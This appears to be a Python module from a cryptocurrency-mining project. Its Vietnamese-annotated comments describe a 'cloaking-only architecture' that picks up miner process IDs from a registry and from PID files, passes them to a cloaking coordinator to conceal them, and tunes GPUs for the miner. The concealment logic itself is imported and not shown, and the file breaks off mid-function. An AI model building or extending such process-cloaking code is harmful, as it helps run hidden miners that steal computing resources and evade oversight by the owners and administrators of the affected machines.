"""
**GPU Resource Management System** (hệ thống quản lý tài nguyên GPU – điều khiển card đồ họa) với **cloaking-only architecture** (kiến trúc chỉ ngụy trang – thiết kế tập trung che giấu).

Cung cấp **centralized GPU resource management** (quản lý tài nguyên GPU tập trung – điều khiển card đồ họa thống nhất), **process monitoring** (giám sát tiến trình – theo dõi quy trình),
và **cloaking strategy application** (áp dụng chiến lược ngụy trang – triển khai che giấu) cho **mining processes** (tiến trình khai thác – quy trình đào coin).
"""

import logging
import psutil
import pynvml
import traceback
import threading
import concurrent.futures
import queue
import time
from threading import RLock
from typing import List, Any, Dict, Optional
from pathlib import Path
import os

# **Core project imports** (import lõi dự án – nhập các module chính)
from mining_environment.scripts.utils import MiningProcess, CloakRequest, CloakResult
from mining_environment.scripts.cloak_strategies import CloakCoordinator  # MỚI: Sử dụng **coordinator** (điều phối viên – bộ phối hợp) thay vì **factory** (nhà máy – bộ tạo)
from mining_environment.scripts.auxiliary_modules.interfaces import IResourceManager
from mining_environment.scripts.auxiliary_modules.models import ConfigModel
from mining_environment.scripts.privileged_operations import get_privileged_manager
from mining_environment.scripts.module_loggers import get_resource_manager_logger
from mining_environment.scripts.error_management import get_error_reporter
from mining_environment.scripts.strategy_cache import get_strategy_cache, CacheEvictionPolicy

# **Module logger** (logger module – bộ ghi nhật ký thành phần)
module_logger = get_resource_manager_logger()

# **GPU Optimization import** (nhập module tối ưu GPU – khắc phục lỗi import)
try:
    # Prefer relative import (ưu tiên import tương đối)
    from .gpu_optimization_orchestrator import GPUOptimizationOrchestrator
    GPU_OPT_AVAILABLE = True
    module_logger.info("✅ [RM] GPU Optimization Orchestrator imported successfully (relative import)")
except Exception as rel_err:
    # Fallback: compute project root dynamically without hard-coded absolute path
    try:
        import sys
        from pathlib import Path
        project_root = Path(__file__).resolve().parents[2]
        if str(project_root) not in sys.path:
            sys.path.insert(0, str(project_root))
        from mining_environment.scripts.gpu_optimization_orchestrator import GPUOptimizationOrchestrator
        GPU_OPT_AVAILABLE = True
        module_logger.info("✅ [RM] GPU Optimization Orchestrator imported successfully (dynamic root fallback)")
    except ImportError as e:
        GPU_OPT_AVAILABLE = False
        module_logger.warning(f"⚠️ [RM] GPU Optimization Orchestrator not available: {e}")

class SharedResourceManager:
    """
    **Shared resource manager** (trình quản lý tài nguyên dùng chung – bộ điều khiển tài nguyên chia sẻ) cho **GPU operations** (hoạt động GPU – thao tác card đồ họa).
    
    **Handles** (xử lý – đảm nhiệm):
    - **NVML lifecycle management** (quản lý vòng đời NVML – điều khiển chu kỳ thư viện NVIDIA)
    - **GPU usage monitoring** (giám sát sử dụng GPU – theo dõi mức dùng card đồ họa)
    - **Cloaking strategy application** (áp dụng chiến lược ngụy trang – triển khai che giấu)
    """

    def __init__(self, config: ConfigModel, logger: logging.Logger, resource_managers: Dict[str, Any]):
        self.logger = get_resource_manager_logger()
        self.config = config
        self.resource_managers = resource_managers
        
        # **Strategy cache initialization** (khởi tạo bộ nhớ đệm chiến lược – thiết lập cache cho phương pháp)
        self.strategy_cache = get_strategy_cache(
            max_size=500,
            ttl_seconds=7200.0,
            eviction_policy=CacheEvictionPolicy.INTELLIGENT
        )
        
        # **Privileged operations manager** (trình quản lý thao tác đặc quyền – bộ điều khiển quyền cao)
        self.privileged_manager = get_privileged_manager(logger)
        
        # **Security context validation** (xác thực ngữ cảnh bảo mật – kiểm tra môi trường an toàn)
        security_context = self.privileged_manager.validate_security_context()
        self.logger.info(f"Security context: User={security_context['user']}, Root={security_context['is_root']}")

        # **NVML initialization** (khởi tạo NVML – thiết lập thư viện NVIDIA) với **decoupling** (tách rời – độc lập) - **non-blocking** (không chặn – không dừng) nếu **NVML fails** (NVML thất bại)
        self._nvml_init = False
        self._nvml_available = False
        
        # Thử **NVML initialization** (khởi tạo NVML) mà không **throwing exceptions** (ném ngoại lệ – báo lỗi) khi **failure** (thất bại)
        try:
            self.initialize_nvml()
            self.logger.info("SharedResourceManager initialized with NVML support")
        except Exception as e:
            self.logger.warning(f"NVML unavailable: {e}")
            self.logger.info("SharedResourceManager operating in fallback mode (no NVML)")
            # Tiếp tục mà không **raising exception** (tạo ngoại lệ – báo lỗi) - hệ thống tiếp tục với **limited functionality** (chức năng hạn chế – tính năng giới hạn)

    def is_nvml_initialized(self) -> bool:
        return self._nvml_init

    def initialize_nvml(self) -> None:
        """**Thread-safe NVML initialization** (khởi tạo NVML an toàn luồng – thiết lập thư viện NVIDIA không xung đột)"""
        if self._nvml_init:
            return

        try:
            def nvml_init_worker():
                pynvml.nvmlInit()
                return True

            with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
                future = executor.submit(nvml_init_worker)
                try:
                    # **Reduced timeout** (thời gian chờ giảm – timeout ngắn) để **prevent long blocking** (ngăn chặn dài – tránh treo lâu)
                    timeout = getattr(self.config, 'nvml_init_timeout', 2.0) 
                    result = future.result(timeout=timeout)
                    if result:
                        self._nvml_init = True
                        self._nvml_available = True
                        self.logger.info("**NVML initialization successful** (khởi tạo NVML thành công – thiết lập thư viện NVIDIA hoàn tất)")
                except concurrent.futures.TimeoutError:
                    self.logger.warning("**NVML initialization timeout** (hết thời gian khởi tạo NVML – quá thời gian chờ thiết lập)")
                    raise
        except Exception as e:
            self.logger.error(f"**NVML initialization failed** (khởi tạo NVML thất bại – thiết lập thư viện NVIDIA lỗi): {e}")
            raise

    def shutdown_nvml(self):
        """**Safe NVML Shutdown** (tắt NVML an toàn – đóng thư viện NVIDIA cẩn thận)"""
        if self._nvml_init:
            try:
                pynvml.nvmlShutdown()
                self._nvml_init = False
                self.logger.info("**NVML shutdown** (NVML đã tắt – thư viện NVIDIA đã đóng)")
            except Exception as e:
                self.logger.error(f"**NVML shutdown error** (lỗi tắt NVML – thất bại đóng thư viện): {e}")

    def get_process_cache_usage(self, pid: int) -> float:
        """**Get Process Cache Usage** (lấy mức dùng cache của tiến trình – đo bộ nhớ đệm process sử dụng)"""
        try:
            if not self._nvml_init:
                return 0.0
                
            process = psutil.Process(pid)
            memory_info = process.memory_info()
            return float(memory_info.rss) / (1024 * 1024)  # MB
        except Exception as e:
            self.logger.debug(f"Không thể lấy **cache usage** (mức dùng cache – bộ nhớ đệm) cho **PID** {pid} (Process ID – mã tiến trình): {e}")
            return 0.0

    def get_gpu_usage_percent(self, pid: int) -> float:
        """**Get GPU Usage Percent** (lấy phần trăm sử dụng GPU – đo mức dùng card đồ họa)"""
        return self._sync_get_gpu_usage_percent(pid)

    def _sync_get_gpu_usage_percent(self, pid: int) -> float:
        """**Synchronous GPU Usage Check** (kiểm tra sử dụng GPU đồng bộ – đo mức dùng card đồ họa tuần tự)"""
        try:
            if not self._nvml_init:
                return 0.0

            device_count = pynvml.nvmlDeviceGetCount()
            for i in range(device_count):
                handle = pynvml.nvmlDeviceGetHandleByIndex(i)
                processes = pynvml.nvmlDeviceGetComputeRunningProcesses(handle)
                
                for proc in processes:
                    if proc.pid == pid:
                        utilization = pynvml.nvmlDeviceGetUtilizationRates(handle)
                        return float(utilization.gpu)
            return 0.0
        except Exception as e:
            self.logger.debug(f"Không thể lấy **GPU usage** (mức dùng GPU – sử dụng card đồ họa) cho **PID** {pid} (Process ID – mã tiến trình): {e}")
            return 0.0

class ResourceManager(IResourceManager):
    """
    **Main Resource Manager Class** (lớp quản lý tài nguyên chính – class điều khiển tài nguyên chủ đạo)
    
    **Simplified Architecture** (kiến trúc đơn giản hóa – thiết kế tối giản):
    - **DirectPIDRegistry Observer-Based Cloaking** (ngụy trang dựa trên observer DirectPIDRegistry – che giấu theo mô hình quan sát)
    - **No Process Discovery or Monitoring** (không khám phá hoặc giám sát tiến trình – bỏ qua tìm kiếm và theo dõi process)  
    - **Thread-Safe Singleton Pattern** (mẫu singleton an toàn luồng – pattern đơn thể không xung đột)
    """

    _instance = None
    _instance_lock = threading.Lock()
    _ready_event = threading.Event()
    _initialization_lock = threading.RLock()

    def __new__(cls, config: ConfigModel, legacy_event_bus=None, logger: logging.Logger = None):
        """**Singleton Creation** (tạo singleton – khởi tạo đơn thể duy nhất)"""
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super(ResourceManager, cls).__new__(cls)
                module_logger.debug("**ResourceManager Singleton Created** (ResourceManager singleton đã tạo – đơn thể quản lý tài nguyên đã khởi tạo)")
        return cls._instance

    def __init__(self, config: ConfigModel, legacy_event_bus=None, logger: logging.Logger = None):
        """**Initialize ResourceManager** (khởi tạo ResourceManager – thiết lập trình quản lý tài nguyên)"""
        if getattr(self, '_initialized', False):
            module_logger.debug("**ResourceManager Singleton Already Initialized** (ResourceManager singleton đã khởi tạo rồi – đơn thể đã được thiết lập)")
            return

        with self._initialization_lock:
            if getattr(self, '_initialized', False):
                return

            self.logger = get_resource_manager_logger()
            self.config = self._validate_configuration(config)
            
            # **Core Components** (thành phần cốt lõi – các phần tử chính)
            self._stop_flag = False
            self.workers = []
            self.resource_adjustment_queue = queue.Queue()
            # **De-duplication set** (tập khử trùng lặp – tránh xử lý 2 lần cùng PID)
            self._processed_pids = set()
            self._last_pid_enqueued_at = 0.0
            
            # **🥇 SOLUTION D: EAGER INITIALIZATION FIX** (sửa lỗi khởi tạo eager – khắc phục thiết lập sớm)
            # Khởi tạo **SharedResourceManager** ngay lập tức để tránh **race condition** (điều kiện đua – xung đột luồng)
            self._shared_resource_manager_lock = threading.Lock()
            self._shared_resource_manager_init_attempted = False
            
            # **🥇 SOLUTION D: Eager initialization** (khởi tạo sớm – thiết lập ngay) với **error handling** (xử lý lỗi – quản lý ngoại lệ)
            try:
                self.logger.info("🔧 [EAGER-INIT] Bắt đầu khởi tạo **SharedResourceManager** (trình quản lý tài nguyên dùng chung)...")
                resource_managers = {'main': self}
                self.shared_resource_manager = SharedResourceManager(
                    self.config, self.logger, resource_managers
                )
                self.logger.info("✅ [EAGER-INIT] **SharedResourceManager** khởi tạo thành công (thiết lập trình quản lý dùng chung hoàn tất)")
                
                # **🥇 SOLUTION D: Signal ready** (báo hiệu sẵn sàng – phát tín hiệu) sau khi **SharedResourceManager** sẵn sàng
                self.signal_ready()
                self.logger.info("✅ [EAGER-INIT] **ResourceManager** đã sẵn sàng nhận **PID** (Process ID – mã tiến trình)")
                
            except Exception as e:
                self.logger.warning(f"⚠️ [EAGER-INIT] **SharedResourceManager** khởi tạo thất bại (thiết lập trình quản lý dùng chung lỗi): {e}")
                self.logger.info("🔄 [EAGER-INIT] Hệ thống sẽ hoạt động ở **limited mode** (chế độ giới hạn – hoạt động hạn chế)")
                self.shared_resource_manager = None
                # Vẫn **signal ready** (báo hiệu sẵn sàng) để không **block** (chặn – dừng) hệ thống
                self.signal_ready()
            
            # **🥇 SOLUTION 1: Add Persistent Service Architecture** (thêm kiến trúc service liên tục – bổ sung thiết kế dịch vụ bền vững)
            self._pid_queue = queue.Queue()  # **Queue** (hàng đợi) cho **incoming PIDs** (PID đến – mã tiến trình mới) từ **registry** (sổ đăng ký)
            self._monitored_processes = {}   # Dict[int, MiningProcess] - **processes under cloaking** (tiến trình đang được ngụy trang – process đang che giấu)
            self.logger.debug(f"🧪 [DIAG-RACE] PID queue created (id={id(self._pid_queue)}); monitored dict created (id={id(self._monitored_processes)}) ngay sau signal_ready()")
            self._monitoring_interval = 30.0  # **Monitor** (giám sát – theo dõi) mỗi 30 giây
            self._last_monitoring_cycle = 0.0
            self._cloaking_stats = {
                'processes_cloaked': 0,
                'cloaking_attempts': 0,
                'failed_cloakings': 0,
                'monitoring_cycles': 0
            }
            
            # **DirectPIDRegistry Integration**: đăng ký explicit từ start_mining.py để tránh nhân đôi
            # (bỏ self-register tại đây theo chiến lược "single registration")
            
            # **🚀 GPU OPTIMIZATION ORCHESTRATOR** (khởi tạo bộ điều phối tối ưu GPU)
            self._gpu_orchestrator = None
            if GPU_OPT_AVAILABLE:
                try:
                    # ✅ Unconditional initialization (khởi tạo không điều kiện)
                    self._gpu_orchestrator = GPUOptimizationOrchestrator()
                    module_logger.info("✅ [RM] GPU Optimization Orchestrator initialized successfully (unconditional)")
                except Exception as e:
                    module_logger.error(f"❌ [RM] Failed to initialize GPU Orchestrator: {e}")
                    self._gpu_orchestrator = None
            
            # **🔍 FILE-BASED SCANNER** (quét file - giải pháp cross-process)
            # Khởi tạo scanner thread để đọc PID files từ DirectPIDRegistry trong subprocess
            self._scanner_stop_flag = False
            self._scanner_thread = threading.Thread(
                target=self._scan_pid_files,
                daemon=True,
                name="PIDFileScanner"
            )
            self._scanner_thread.start()
            module_logger.info("✅ [FILE-SCANNER] PID file scanner thread started successfully")
            
            self._initialized = True
            module_logger.info("**ResourceManager initialization successful** (ResourceManager khởi tạo thành công – thiết lập trình quản lý hoàn tất)")

    @classmethod
    def wait_for_ready(cls, timeout: float = 10.0) -> bool:
        """**Wait for ResourceManager Ready** (chờ ResourceManager sẵn sàng)"""
        try:
            return cls._ready_event.wait(timeout=timeout)
        except Exception as e:
            module_logger.error(f"Lỗi chờ ResourceManager ready: {e}")
            return False

    @classmethod
    def is_ready(cls) -> bool:
        """**Check if ResourceManager is Ready** (kiểm tra ResourceManager sẵn sàng)"""
        return cls._ready_event.is_set()

    @classmethod
    def signal_ready(cls):
        """**Signal ResourceManager Ready** (báo hiệu ResourceManager sẵn sàng)"""
        cls._ready_event.set()
        module_logger.info("ResourceManager Ready Signal Set")

    @classmethod
    def clear_ready_signal(cls):
        """**Clear ResourceManager Ready Signal** (xóa tín hiệu sẵn sàng)"""
        cls._ready_event.clear()
        module_logger.info("ResourceManager Ready Signal Cleared")

    def _validate_configuration(self, config: ConfigModel) -> ConfigModel:
        """**Validate Configuration** (xác thực cấu hình)"""
        if not config:
            raise ValueError("Configuration không được None")
        
        # **Cloaking Strategies Validation** (xác thực chiến lược che giấu)
        if not hasattr(config, 'cloaking_strategies') or not config.cloaking_strategies:
            self.logger.warning("Không có cloaking strategies, sử dụng mặc định")
            
        return config

    def is_gpu_initialized(self) -> bool:
        """**Check GPU Initialization** (kiểm tra khởi tạo GPU)"""
        return self.shared_resource_manager and self.shared_resource_manager.is_nvml_initialized()


    def _ensure_shared_resource_manager(self) -> bool:
        """**Lazy Initialize SharedResourceManager** (khởi tạo lười SharedResourceManager)
        
        Chỉ khởi tạo SharedResourceManager khi thực sự cần dùng.
        Sử dụng lock để tránh race condition khi nhiều thread gọi cùng lúc.
        
        Returns:
            bool: True nếu SharedResourceManager sẵn sàng, False nếu không
        """
        # Fast path: đã khởi tạo rồi
        if self.shared_resource_manager is not None:
            return True
            
        # Slow path: cần khởi tạo
        with self._shared_resource_manager_lock:
            # Double-check pattern
            if self.shared_resource_manager is not None:
                return True
                
            # Chỉ thử một lần để tránh block lâu
            if self._shared_resource_manager_init_attempted:
                return False
                
            self._shared_resource_manager_init_attempted = True
            self.logger.info("🔧 [LAZY-INIT] Bắt đầu khởi tạo SharedResourceManager...")
            
            try:
                # Thử khởi tạo với timeout ngắn
                resource_managers = {'main': self}
                self.shared_resource_manager = SharedResourceManager(
                    self.config, self.logger, resource_managers
                )
                self.logger.info("✅ [LAZY-INIT] SharedResourceManager khởi tạo thành công")
                return True
                
            except Exception as e:
                self.logger.warning(f"⚠️ [LAZY-INIT] SharedResourceManager khởi tạo thất bại: {e}")
                self.logger.info("🔄 [LAZY-INIT] Hệ thống sẽ hoạt động ở chế độ giới hạn")
                self.shared_resource_manager = None
                return False
    
    def _setup_direct_registry_observer(self):
        """**Setup DirectPIDRegistry Observer** (thiết lập observer DirectPIDRegistry)"""
        try:
            # Theo chiến lược mới: bỏ đăng ký tại đây, chỉ log định hướng
            self.logger.info("ℹ️ [REGISTRATION] Skipping in-constructor DirectPIDRegistry registration (explicit in start_mining.py)")
            
        except Exception as e:
            self.logger.error(f"❌ Lỗi thiết lập DirectPIDRegistry: {e}")    
    
    # IPC methods đã bị loại bỏ - giữ lại stub để tránh breaking changes
    def _handle_ipc_heartbeat(self, ipc_message) -> bool:
        """(Removed) IPC Heartbeat no-op"""
        return False

    def _handle_ipc_shutdown(self, ipc_message) -> bool:
        """(Removed) IPC Shutdown no-op"""
        return False

    def _handle_ipc_status_check(self, ipc_message) -> bool:
        """(Removed) IPC Status Check no-op"""
        return False

    def _on_process_registered_direct(self, process_info) -> None:
        """**Handle Process Registration** (xử lý đăng ký process)"""
        try:
            self.logger.info(f"🎯 [OBSERVER-CALLBACK] _on_process_registered_direct called with process_info: {process_info}")
            
            # ProcessInfo is a dataclass, not a dict - access attributes directly
            if not hasattr(process_info, 'pid'):
                self.logger.warning("ProcessInfo missing pid attribute")
                return
                
            pid = process_info.pid
            if not pid:
                self.logger.warning(f"ProcessInfo has empty pid: {process_info}")
                return
            
            self.logger.info(f"📍 [OBSERVER-CALLBACK] Processing PID {pid} from DirectPIDRegistry")

            # **Create MiningProcess** (tạo MiningProcess)
            # Extract cmd from metadata if available, otherwise use empty list
            cmd = []
            if hasattr(process_info, 'metadata') and process_info.metadata:
                cmd = process_info.metadata.get('cmd', [])
                
            mining_process = MiningProcess(
                pid=pid,
                name=process_info.process_name if hasattr(process_info, 'process_name') else f'process_{pid}',
                cmd=cmd
            )

            # **Trigger Cloaking** (kích hoạt che giấu)
            self.logger.info(f"🚀 [OBSERVER-CALLBACK] About to trigger cloaking for PID {pid}")
            self.trigger_cloaking(mining_process, 'direct_registry')
            self.logger.info(f"✅ [OBSERVER-CALLBACK] Cloaking triggered successfully for PID {pid}")
            
        except Exception as e:
            self.logger.error(f"Lỗi xử lý process registration: {e}")

    def trigger_cloaking(self, process: MiningProcess, source: str = 'unknown') -> bool:
        """
        Kích hoạt cloaking cho một `MiningProcess`.

        Stage 1 (ResourceManager):
        • Tạo `CloakRequest` tối thiểu chỉ chứa `pid` + `metadata`.
        • Forward trực tiếp sang `CloakCoordinator` (Stage 2) – nơi quyết định strategy và chuẩn bị tham số.

        Parameters
        ----------
        process : MiningProcess
            Tiến trình cần cloaking.
        source : str, optional
            Nguồn gọi cloaking (observer/file scanner…), mặc định "unknown".

        Returns
        -------
        bool
            `True` nếu cloaking thành công, ngược lại `False`.
        """
        try:
            self.logger.info(
                f"[RM] Stage 1: Trigger cloaking for PID {process.pid} (source={source})"
            )

            # Lazy-init coordinator
            if not hasattr(self, "cloak_coordinator"):
                # Try to inject shared Metrics Hub from GPU Orchestrator if available
                shared_hub = None
                try:
                    if getattr(self, "_gpu_orchestrator", None) is not None:
                        shared_hub = getattr(self._gpu_orchestrator, "metrics_hub", None)
                except Exception:
                    shared_hub = None

                self.cloak_coordinator = CloakCoordinator(self.config, metrics_hub=shared_hub)
                self.logger.info("[RM] Initialized CloakCoordinator (shared metrics hub injected=%s)" % (shared_hub is not None))

            # Build minimal request (Stage 1)
            request = CloakRequest(
                pid=process.pid,
                strategy_name=None,  # Stage 2 sẽ quyết định
                params={},
                metadata={"source": source, "process_name": process.name},
            )

            self.logger.debug(f"[RM] Built CloakRequest: {request.to_dict()}")

            # Forward to Stage 2 – Coordinator
            result = self.cloak_coordinator.process_request(request)

            if result.success:
                self.logger.info(f"[RM] ✅ Cloaking successful for PID {process.pid}")
                self.logger.debug(f"[RM] Applied controls: {result.applied_controls}")
                
                # **🚀 TRIGGER GPU OPTIMIZATION** (kích hoạt tối ưu GPU – gọi orchestrator)
                if self._gpu_orchestrator is not None:
                    try:
                        self.logger.info(f"[RM] 🎯 **Starting GPU Optimization** (bắt đầu tối ưu GPU – kích hoạt điều chỉnh card đồ họa) for PID {process.pid}")
                        self.logger.info(f"[RM] 📊 **Process details** (chi tiết tiến trình): name={process.name}, source={source}")
                        
                        # **Determine GPU index** (xác định chỉ số GPU – chọn card đồ họa)
                        gpu_index = 0
                        self.logger.debug(f"[RM] 🎮 **Target GPU** (GPU mục tiêu – card đồ họa được chọn): index={gpu_index}")
                        
                        # **Async GPU optimization** (tối ưu GPU bất đồng bộ – điều chỉnh không chặn)
                        def _optimize_async(pid_val: int, gpu_idx: int):
                            try:
                                self.logger.info(f"[RM] 🔧 **GPU Optimization thread started** (luồng tối ưu GPU đã khởi động – thread điều chỉnh bắt đầu) for PID {pid_val}")
                                
                                # **Cooldown period** (thời gian chờ nguội – độ trễ an toàn)
                                try:
                                    cooldown_sec = float(os.getenv('GPU_OPT_COOLDOWN_SEC', '2.0'))
                                except Exception:
                                    cooldown_sec = 2.0
                                if cooldown_sec > 0:
                                    self.logger.debug(f"[RM] ⏱️ **Cooldown wait** (chờ nguội – tạm dừng an toàn): {cooldown_sec}s to avoid conflicts")
                                    time.sleep(cooldown_sec)

                                # **Execute optimization** (thực thi tối ưu – chạy điều chỉnh)
                                try:
                                    self.logger.info(f"[RM] 🚀 **Calling GPU Orchestrator** (gọi điều phối GPU – kích hoạt bộ điều khiển) for PID {pid_val}")
                                    
                                    # Quyết định nhánh tối ưu: tất cả GPU hay một GPU
                                    try:
                                        optimize_all = str(os.getenv('OPTIMIZE_ALL_GPUS', 'true')).lower() in ('1', 'true', 'yes', 'all')
                                    except Exception:
                                        optimize_all = True

                                    if optimize_all and hasattr(self._gpu_orchestrator, 'optimize_gpu_for_all_available'):
                                        # Log detected GPU indices before ALL-GPU optimization (NVML or stealth log fallback)
                                        try:
                                            indices = self._gpu_orchestrator._get_available_gpu_indices()
                                            self.logger.info(f"[RM] 🔎 Detected GPU indices: {indices}")
                                        except Exception:
                                            pass
                                        opt_result = self._gpu_orchestrator.optimize_gpu_for_all_available(
                                            pid=pid_val,
                                            strategies=None
                                        )
                                        self.logger.info(f"[RM] ✅ **GPU Optimization (ALL-GPUs) completed** for PID {pid_val} | indices={opt_result.get('gpu_indices')} success={opt_result.get('success')}")

                                        # Ghi log kết quả theo từng GPU
                                        try:
                                            for _res in (opt_result.get('results') or []):
                                                try:
                                                    gi = _res.get('gpu_index')
                                                    succ = _res.get('success')
                                                    errs = _res.get('errors')
                                                    self.logger.info(f"[RM] 📊 Result per GPU → gpu_index={gi} success={succ} errors={errs}")
                                                except Exception:
                                                    pass
                                        except Exception:
                                            pass
                                    else:
                                        opt_result = self._gpu_orchestrator.optimize_gpu_for_process(
                                            pid=pid_val,
                                            gpu_index=gpu_idx,
                                            strategies=None
                                        )
                                        self.logger.info(f"[RM] ✅ **GPU Optimization completed** (tối ưu GPU hoàn tất – điều chỉnh xong) for PID {pid_val}")

                                        # **Analyze results** (phân tích kết quả – kiểm tra đầu ra)
                                        hw = opt_result.get('hardware_results', {}) if isinstance(opt_result, dict) else {}
                                        safety = None
                                        if isinstance(hw, dict):
                                            self.logger.debug(f"[RM] 📈 **Hardware results** (kết quả phần cứng – đầu ra điều chỉnh): success={hw.get('success')}")
                                            pred = hw.get('temperature_prediction', {})
                                            if isinstance(pred, dict):
                                                safety = pred.get('safety_status')
                                                self.logger.info(f"[RM] 🌡️ **Temperature safety** (an toàn nhiệt độ – trạng thái nhiệt): {safety}")

                                        # **Safety check and rollback** (kiểm tra an toàn và hoàn trả – xác thực và khôi phục)
                                        if (isinstance(hw, dict) and not hw.get('success', False)) or hw.get('error') or safety in ('CRITICAL', 'EMERGENCY'):
                                            self.logger.warning(f"[RM] ⚠️ **Optimization risk detected** (phát hiện rủi ro tối ưu – cảnh báo nguy hiểm) for PID {pid_val} (safety={safety})")
                                            self.logger.warning(f"[RM] 🔄 **Attempting rollback** (thử hoàn trả – khôi phục cài đặt gốc)...")
                                            try:
                                                hc = getattr(self._gpu_orchestrator, 'hardware_controller', None)
                                                gm = getattr(hc, 'gpu_manager', None) if hc else None
                                                if gm and hasattr(gm, 'restore_gpu_settings_for_pid'):
                                                    restored = gm.restore_gpu_settings_for_pid(pid_val)
                                                    self.logger.info(f"[RM] ✅ **Rollback successful** (hoàn trả thành công – khôi phục xong) for PID {pid_val}: {restored}")
                                                else:
                                                    self.logger.warning(f"[RM] ⚠️ **No rollback method available** (không có phương thức hoàn trả – thiếu hàm khôi phục)")
                                            except Exception as rb_err:
                                                self.logger.error(f"[RM] ❌ **Rollback failed** (hoàn trả thất bại – khôi phục lỗi) for PID {pid_val}: {rb_err}")
                                        else:
                                            self.logger.info(f"[RM] ✅ **GPU Optimization successful** (tối ưu GPU thành công – điều chỉnh hoàn hảo) for PID {pid_val}")
                                        
                                except Exception as eval_err:
                                    self.logger.error(f"[RM] ❌ **Optimization evaluation error** (lỗi đánh giá tối ưu – thất bại phân tích): {eval_err}")
                                    
                            except Exception as _e:
                                self.logger.error(f"[RM] ❌ **GPU Optimization thread failed** (luồng tối ưu GPU thất bại – thread lỗi) for PID {pid_val}: {_e}")
                                import traceback
                                self.logger.debug(f"[RM] 🔍 **Traceback** (dấu vết lỗi): {traceback.format_exc()}")

                        # **Start optimization thread** (khởi động luồng tối ưu – chạy thread điều chỉnh)
                        t = threading.Thread(target=_optimize_async, args=(process.pid, gpu_index), name=f"RM-GPU-OPT-{process.pid}", daemon=True)
                        t.start()
                        self.logger.info(f"[RM] 🏃 **GPU Optimization thread launched** (luồng tối ưu GPU đã phóng – thread chạy nền) for PID {process.pid}")
                                
                    except Exception as e:
                        self.logger.error(f"[RM] ❌ **GPU Optimization launch failed** (khởi động tối ưu GPU thất bại – không thể bắt đầu) for PID {process.pid}: {e}")
                        import traceback
                        self.logger.debug(f"[RM] Traceback: {traceback.format_exc()}")
                else:
                    self.logger.debug(f"[RM] GPU Optimization not available for PID {process.pid}")
            else:
                self.logger.error(f"[RM] ❌ Cloaking failed: {result.error_msg}")

            return result.success

        except Exception as e:
            self.logger.error(f"[RM] Exception in trigger_cloaking: {e}")
            import traceback
            self.logger.debug(f"[RM] Traceback: {traceback.format_exc()}")
            return False

    def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        """**Collect Process Metrics** (thu thập metrics của process)"""
        metrics = {
            'timestamp': time.time(),
            'pid': process.pid,
            'name': process.name
        }
        
        try:
            if self.shared_resource_manager:
                metrics['gpu_usage'] = self.shared_resource_manager.get_gpu_usage_percent(process.pid)
                metrics['cache_usage'] = self.shared_resource_manager.get_process_cache_usage(process.pid)
        except Exception as e:
            self.logger.debug(f"Lỗi thu thập metrics cho PID {process.pid}: {e}")
            
        return metrics

    def start(self):
        """**TIER 1 FIX: Enhanced ResourceManager Start** (khởi động ResourceManager nâng cao)"""
        try:
            self.logger.info("🚀 [TIER-1] Khởi động ResourceManager với enhanced initialization...")
            
            # **TIER 1 FIX: Validate prerequisites** (xác thực điều kiện tiên quyết)
            if not self.config:
                raise ValueError("Configuration missing - cannot start ResourceManager")
            
            # **🥇 CRITICAL FIX: Check if SharedResourceManager already initialized trong __init__** 
            if self.shared_resource_manager is not None:
                self.logger.info("✅ [CRITICAL] SharedResourceManager đã được khởi tạo trong __init__, skip initialization trong start()")
            else:
                # **TIER 1 FIX: Retry SharedResourceManager initialization trong start()** (thử lại khởi tạo SharedResourceManager trong start())
                self.logger.info("🔧 [TIER-1] SharedResourceManager chưa được khởi tạo, retry trong start()...")
                resource_managers = {'main': self}
                
                try:
                    self.shared_resource_manager = SharedResourceManager(
                        self.config, self.logger, resource_managers
                    )
                    self.logger.info("✅ [TIER-1] SharedResourceManager retry initialization successful")
                    
                except Exception as srm_error:
                    self.logger.error(f"❌ [TIER-1] SharedResourceManager retry initialization failed: {srm_error}")
                    raise RuntimeError(f"Failed to initialize SharedResourceManager trong start(): {srm_error}")
            
            # **TIER 1 FIX: Final Validation** (xác thực cuối cùng)
            if self.shared_resource_manager is None:
                raise RuntimeError("Critical validation failed: SharedResourceManager is None after initialization")
            
            # **Start Worker Threads** (khởi động worker threads)
            self.logger.info("⚙️ [TIER-1] Starting worker threads...")
            self._start_workers()
            
            # **DirectPIDRegistry Observer** (DirectPIDRegistry observer đã được thiết lập trong __init__)
            # Process discovery sẽ được xử lý thông qua DirectPIDRegistry callbacks
            
            # **TIER 1 FIX: Enhanced Ready Signal with validation** (tín hiệu sẵn sàng nâng cao với xác thực)
            self.logger.info("🎯 [TIER-1] Signaling ResourceManager ready...")
            self.signal_ready()
            
            # **TIER 1 FIX: Final validation** (xác thực cuối cùng)
            if self.shared_resource_manager is None:
                raise RuntimeError("Critical validation failed: SharedResourceManager is None after initialization")
            
            self.logger.info("✅ [TIER-1] ResourceManager đã khởi động thành công với SharedResourceManager")
            self.logger.info(f"🔍 [TIER-1] SharedResourceManager status: {self.shared_resource_manager is not None}")
            
            # 🔗 DirectPIDRegistry registration được thực hiện rõ ràng trong start_mining.py
            
        except Exception as e:
            self.logger.error(f"❌ [TIER-1] Lỗi khởi động ResourceManager: {e}")
            self.logger.error(f"🔍 [TIER-1] SharedResourceManager status: {getattr(self, 'shared_resource_manager', 'Not initialized')}")
            raise

    def _scan_pid_files(self):
        """
        **FILE-BASED SCANNER** (quét file - giải pháp cross-process)
        
        Scan for PID files from subprocess DirectPIDRegistry.
        Files are located in: /app/mining_environment/logs/ncs_pid_registry/
        File format: pid_<PID>.json
        """
        import json
        from pathlib import Path
        
        # Đường dẫn chính xác theo RegistryConfig
        pid_registry_dir = Path(os.getenv('LOGS_DIR', '/app/mining_environment/logs')) / 'ncs_pid_registry'
        
        self.logger.info(f"📂 [FILE-SCANNER] Starting PID file scanner, monitoring: {pid_registry_dir}")
        
        while not self._scanner_stop_flag:
            try:
                # Tạo thư mục nếu chưa tồn tại
                pid_registry_dir.mkdir(parents=True, exist_ok=True)
                
                # Tìm tất cả PID files
                pid_files = list(pid_registry_dir.glob('pid_*.json'))
                
                if pid_files:
                    self.logger.debug(f"🔍 [FILE-SCANNER] Found {len(pid_files)} PID files to process")
                
                for pid_file in pid_files:
                    try:
                        # Đọc file JSON
                        with open(pid_file, 'r') as f:
                            data = json.load(f)
                        
                        # Extract PID và metadata
                        pid = data.get('pid')
                        metadata = data.get('metadata', {})
                        timestamp = data.get('timestamp', time.time())

                        # NEW: Skip file if expired (TTL)
                        expires_at = data.get('expires_at')
